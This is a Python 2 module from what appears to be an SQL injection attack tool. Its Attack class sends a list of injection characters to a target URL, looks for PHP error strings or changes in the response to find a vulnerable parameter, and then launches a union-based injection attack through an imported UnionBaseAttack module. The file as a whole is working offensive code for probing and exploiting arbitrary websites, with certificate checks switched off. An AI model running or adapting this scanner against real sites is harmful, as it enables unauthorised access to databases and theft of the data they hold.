# -*- coding: utf-8 -*-
'''
This file in first find vulnrability then pass the injected item and url firstResponse to
exploiting file tester
'''
try:
    import src.libs as lib
    from src.Colors import TextColor
    from injection_defines import (define_injections_chars, define_error_list_php)
    from test_UnionBase import test_UnionBaseAttack
    from Config.WebConfig import define_headerdata
    from UnionBaseAttack import UnionBaseAttack

except Exception as err:
    raise SystemExit, TextColor.RED + TextColor.BOLD + str("What happened :( something is wrong: %s"%(err)) \
                      + TextColor.WHITE

class Attack(object):
    def __init__(self, url):
        self.url = url

        self.__TestVulnarability__()

    def __TestVulnarability__(self):
        global define_data
        print

        firstResponse = lib.requests.get(url=self.url, headers=define_headerdata, verify=False)

        injectedChar = ""
        was_Vulnrable = False

        '''
            we check all bypass and attacks until to knowing that this site has sql injection vulnarabilities or not
            if we find vulnrabilities so we break <for> statement and start to inject sql command
        '''
        for item in define_injections_chars:
            lib.sys.stdout.write(TextColor.CYAN + str('[%s]'%(self.url + str(item))) + TextColor.WHITE)
            resposne = lib.requests.get(url=self.url + str(item), headers=define_headerdata, verify=False)
            lib.sleep(.5)
            if resposne.content.find(define_error_list_php[0]) is not -1 \
                    or resposne.content.find(define_error_list_php[1]) is not -1 \
                    or resposne.content.find(define_error_list_php[2]) is not -1 \
                    or resposne.content.find(define_error_list_php[3]) is not -1:
                print TextColor.RED + str(" => find vulnrability") + TextColor.WHITE
                was_Vulnrable = True
                injectedChar = item
                break
            elif resposne.content != firstResponse.content:
                print TextColor.RED + str(" => find vulnrability") + TextColor.WHITE
                was_Vulnrable = True
                injectedChar = item
                break
            #todo: check blind base attacks
            else:
                print TextColor.GREEN + " => clear"

        if injectedChar != "" and was_Vulnrable == True:
            UnionBaseAttack(self.url, injectedChar, firstResponse)
